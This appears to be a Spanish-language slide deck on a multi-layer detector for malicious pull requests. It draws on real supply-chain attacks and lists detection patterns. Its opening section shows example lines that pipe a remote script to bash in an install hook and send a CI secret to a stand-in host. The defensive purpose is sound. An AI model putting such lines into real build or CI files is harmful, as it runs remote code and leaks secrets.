00El contexto

La revisión humana ya perdió esta carrera

Fatiga del revisor, sesgo de confianza hacia colaboradores habituales, y la dificultad de detectar intención maliciosa cuando se disimula dentro de un cambio que parece legítimo. No es hipotético: son tres campañas reales de los últimos dos años.

2024 · CVE-2024-3094

XZ Utils

Una puerta trasera en liblzma, introducida por alguien que se ganó la confianza del proyecto durante años. El payload vivía en ficheros de test binarios y scripts de build, invisible en un diff normal.

m4/build-to-host.m4
+ [ofuscado · activado solo en build]
2026 · AUR

Atomic Arch

De varios cientos a más de 1.500 paquetes comprometidos en días. Los atacantes falsificaban nombre y correo de commits anteriores para simular continuidad con el mantenedor legítimo.

post_install() {
+ curl -s http://cdn.example/x | bash
}
2026 · Wiz Research

prt-scan

Seis cuentas generando PRs maliciosos a escala con IA, con el payload adaptado automáticamente al lenguaje y stack de cada repositorio objetivo, contra GitHub Actions.

.github/workflows/ci.yml
+ run: curl -d "$SECRET" evil.example

02Arquitectura

Un núcleo agnóstico, cuatro señales en paralelo

El núcleo no sabe nada de GitHub, GitLab ni del proveedor de LLM: solo procesa un diff normalizado. Los adaptadores finos traducen cada plataforma a ese contrato común, así que añadir GitLab o un Git interno no significa reescribir nada.

03Las cuatro señales

Cada capa es un módulo intercambiable

Misma entrada (diff + metadata), misma salida (puntuación 0–100 + justificación en texto). Se puede desactivar una capa por proyecto, o cambiar el proveedor de LLM, sin tocar el resto.

3a

Estática

Semgrep + YARA

Patrones de código peligrosos conocidos: eval/exec sobre entrada no literal, curl | bash en scripts de build, escritura a rutas sensibles, blobs base64 de alta entropía.

3b

Dependencias

OSV + distancia de edición

Paquetes nuevos o modificados, CVEs conocidas contra la base pública de OSV, y typosquatting (nombres a 1–2 caracteres de un paquete popular legítimo).

3c

Reputación

reglas explícitas, no ML

Cruza identidad declarada (nombre/email del commit) contra el historial real de la cuenta: antigüedad, contribuciones previas, firma. El vector directo contra Atomic Arch.

3d

Semántica

LLM + RAG + tools acotadas

Evalúa la intención del cambio con independencia de quién parezca haberlo firmado, con contexto de ataques conocidos y hasta 3 llamadas a herramientas de investigación.

04Zoom: la capa semántica

El LLM no decide solo con lo que ve

Antes de preguntar, el sistema ya le sirve contexto de casos reales parecidos (RAG). Durante el análisis, el modelo puede pedir investigar más por su cuenta — hasta un límite duro.

01
Control de coste

¿Hay presupuesto de tokens este mes? ¿Este diff exacto ya se analizó? Si no hay presupuesto, se omite sin llamar al LLM.

02
RAG — recuperación automática

El propio sistema resume el diff y busca los 3 casos más parecidos en un corpus local: XZ Utils, Atomic Arch, prt-scan, técnicas MITRE ATT&CK. El LLM no lo pide, ya le llega servido.

03
El LLM investiga (si lo necesita)

Aquí sí decide él: puede pedir hasta 3 herramientas antes de responder.

lookup_package_registry get_commit_history fetch_referenced_file
05
Veredicto estructurado

risk_score · category · justification · confidence — JSON validado, se cachea, se combina con las otras 3 capas.
